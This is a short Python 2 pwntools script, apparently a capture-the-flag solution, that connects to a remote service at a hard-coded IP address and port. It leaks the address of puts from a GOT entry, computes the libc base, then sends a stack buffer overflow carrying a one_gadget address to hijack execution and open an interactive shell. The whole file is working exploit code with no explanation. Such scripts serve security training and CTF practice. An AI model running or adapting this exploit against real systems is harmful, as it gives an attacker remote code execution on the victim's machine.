#!/usr/bin/env python2

from pwn import *

p = remote('140.110.112.192', 2123)
offset = 0x06f690
one_gadget = 0x45216

p.sendlineafter('(in hex) :', '0x601018')
libc_puts = int(str(p.recvuntil('\n', drop='True')[29:]), 16)
libc_base = libc_puts - offset
print '[+]Libc base address:', hex(libc_base)
target = libc_base + one_gadget
p.sendlineafter('Leave some message for me :', 'A'* (0x110 + 8) + p64(target))

p.interactive()
p.close()
